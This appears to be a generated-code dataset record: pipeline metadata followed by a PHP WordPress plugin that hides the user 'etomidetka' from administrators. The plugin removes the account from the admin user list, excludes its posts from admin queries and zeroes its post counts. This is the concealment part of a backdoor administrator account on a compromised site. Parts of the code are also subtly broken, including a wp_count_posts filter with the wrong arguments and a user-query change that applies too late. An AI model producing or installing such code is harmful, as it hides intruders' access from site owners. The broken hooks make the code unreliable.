"""
Generated Code Metadata:
========================
Original URL: https://pizzacone.ae
Prompt: Write a WordPress plugin that uses `add_filter` and `add_action` to exclude a specific user (e.g., "etomidetka") from the admin user list and post queries, similar to the functionality described on the webpage.
Generated: DETERMINISTIC_b6c1f73cb18c1d49
Batch ID: 20250612_152924
URLs Found: 0
Malicious URLs: 0

Oracle Results:
No URLs checked
"""

# Generated Code:
# ===============

```php
<?php
/*
Plugin Name: Exclude User from Admin
Description: Exclude a specific user from the admin user list and post queries.
Version: 1.0
Author: Your Name
*/

// Define the excluded user ID
define( 'EXCLUDED_USER_ID', get_user_by( 'login', 'etomidetka' )->ID );

/**
 * Exclude the specific user from the admin user list.
 *
 * @param \WP_User_Query $query The user query object.
 */
function exclude_user_from_admin_user_list( $query ) {
    // Check if we're in the admin area and the query is for users.
    if ( is_admin() && $query->query_vars['fields'] !== 'ID' ) {
        // Add the excluded user ID to the query.
        $query->query_vars['exclude'] = array_merge( (array) $query->query_vars['exclude'], array( EXCLUDED_USER_ID ) );
    }
}
add_filter( 'pre_user_query', 'exclude_user_from_admin_user_list' );

/**
 * Exclude the specific user's posts from queries.
 *
 * @param \WP_Query $query The query object.
 */
function exclude_user_from_post_queries( $query ) {
    // Check if we're in the admin area and the query is for posts.
    if ( is_admin() && $query->is_main_query() && $query->query_vars['post_type'] !== 'nav_menu_item' ) {
        // Add the excluded user ID to the query.
        $query->set( 'author__not_in', array( EXCLUDED_USER_ID ) );
    }
}
add_action( 'pre_get_posts', 'exclude_user_from_post_queries' );

/**
 * Prevent the excluded user from being counted in post counts.
 *
 * @param int $count The post count.
 * @param string $type The post type.
 * @param string $status The post status.
 * @param int $author The post author.
 * @return int The post count.
 */
function exclude_user_from_post_counts( $count, $type, $status, $author ) {
    // Check if the author is the excluded user.
    if ( $author === EXCLUDED_USER_ID ) {
        // Return 0 to exclude the user from post counts.
        return 0;
    }
    return $count;
}
add_filter( 'wp_count_posts', 'exclude_user_from_post_counts', 10, 4 );
```
